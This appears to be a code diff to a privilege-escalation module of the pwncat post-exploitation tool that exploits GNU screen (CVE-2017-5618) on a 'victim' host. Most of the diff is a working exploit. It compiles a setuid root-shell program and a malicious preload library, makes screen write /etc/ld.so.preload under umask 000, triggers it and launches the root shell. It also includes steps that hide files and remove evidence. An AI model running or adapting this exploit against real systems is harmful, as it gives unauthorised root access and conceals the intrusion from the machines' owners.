@@ -2,17 +2,19 @@
 
 import re
 import textwrap
+from io import StringIO
 from typing import List
 
 import pwncat
 from pwncat.gtfobins import Capability
 from pwncat.privesc import Technique, BaseMethod, PrivescError
+from pwncat.util import CompilationError
 
 
 class Method(BaseMethod):
 
     name = "screen (CVE-2017-5618)"
-    BINARIES = ["cc", "screen"]
+    BINARIES = ["screen"]
 
     def __init__(self):
         self.ran_before = False
@@ -55,23 +57,27 @@ class Method(BaseMethod):
 
         self.ran_before = True
 
-        # Hide the activity by creating hidden temporary files
-        libhack_c = (
-            pwncat.victim.run("mktemp -t .XXXXXXXXXXX --suffix .c")
-            .decode("utf-8")
-            .strip()
-        )
-        libhack_so = (
-            pwncat.victim.run("mktemp -t .XXXXXXXXXXX --suffix .so")
-            .decode("utf-8")
-            .strip()
-        )
-        rootshell_c = (
-            pwncat.victim.run("mktemp -t .XXXXXXXXXXX --suffix .c")
-            .decode("utf-8")
-            .strip()
-        )
-        rootshell = pwncat.victim.run("mktemp -t .XXXXXXXXXXX").decode("utf-8").strip()
+        # Write the rootshell source code
+        rootshell_source = textwrap.dedent(
+            f"""
+                #include <stdio.h>
+                int main(void){{
+                    setuid(0);
+                    setgid(0);
+                    seteuid(0);
+                    setegid(0);
+                    execvp("{pwncat.victim.shell}", NULL, NULL);
+                }}
+                """
+        ).lstrip()
+
+        # Compile the rootshell binary
+        try:
+            rootshell = pwncat.victim.compile([StringIO(rootshell_source)])
+        except CompilationError as exc:
+            raise PrivescError(f"compilation failed: {exc}")
+
+        rootshell_tamper = pwncat.victim.tamper.created_file(rootshell)
 
         # Write the library
         libhack_source = textwrap.dedent(
@@ -88,44 +94,33 @@ class Method(BaseMethod):
                 """
         ).lstrip()
 
-        with pwncat.victim.open(libhack_c, "w", length=len(libhack_source)) as filp:
-            filp.write(libhack_source)
-
-        # Compile the library
-        pwncat.victim.run(f"gcc -fPIC -shared -ldl -o {libhack_so} {libhack_c}")
-
-        # Write the rootshell source code
-        rootshell_source = textwrap.dedent(
-            f"""
-                #include <stdio.h>
-                int main(void){{
-                    setuid(0);
-                    setgid(0);
-                    seteuid(0);
-                    setegid(0);
-                    execvp("{pwncat.victim.shell}", NULL, NULL);
-                }}
-                """
-        ).lstrip()
-
-        with pwncat.victim.open(rootshell_c, "w", length=len(rootshell_source)) as filp:
-            filp.write(rootshell_source)
-
-        # Compile the rootshell binary
-        pwncat.victim.run(f"gcc -o {rootshell} {rootshell_c}")
+        # Compile libhack
+        try:
+            libhack_so = pwncat.victim.compile(
+                [StringIO(libhack_source)],
+                cflags=["-fPIC", "-shared"],
+                ldflags=["-ldl"],
+            )
+        except CompilationError as exc:
+            pwncat.victim.tamper.remove(rootshell_tamper)
+            raise PrivescError("compilation failed: {exc}")
 
         # Switch to /etc but save our previous directory so we can return to it
-        pwncat.victim.run("pushd /etc")
+        old_cwd = pwncat.victim.env(["pwd"]).strip().decode("utf-8")
+        pwncat.victim.run("cd /etc")
 
         # Run screen with our library, saving the umask before changing it
         start_umask = pwncat.victim.run("umask").decode("utf-8").strip()
         pwncat.victim.run("umask 000")
-        # sleep(1)
+
+        # Run screen, loading our library and causing our rootshell to be SUID
         pwncat.victim.run(f'screen -D -m -L ld.so.preload echo -ne "{libhack_so}"')
-        # sleep(1)
 
         # Trigger the exploit
         pwncat.victim.run("screen -ls")
+
+        # We no longer need the shared object
+        pwncat.victim.env(["rm", "-f", libhack_so])
 
         # Reset umask to the saved value
         pwncat.victim.run(f"umask {start_umask}")
@@ -135,14 +130,15 @@ class Method(BaseMethod):
         if file_owner != b"0":
 
             # Hop back to the original directory
-            pwncat.victim.run("popd")
+            pwncat.victim.env(["cd", old_cwd])
+
+            # Ensure the files are removed
+            pwncat.victim.env(["rm", "-f", libhack_so, rootshell])
+
             raise PrivescError("failed to create root shell")
 
         # Hop back to the original directory
-        pwncat.victim.run("popd")
+        pwncat.victim.env(["cd", old_cwd])
 
         # Start the root shell!
-        pwncat.victim.run(f"{rootshell}", wait=False)
-
-        # Remove the evidence
-        pwncat.victim.run(f"unlink {libhack_so} {libhack_c} {rootshell_c} {rootshell}")
+        pwncat.victim.run(rootshell, wait=False)
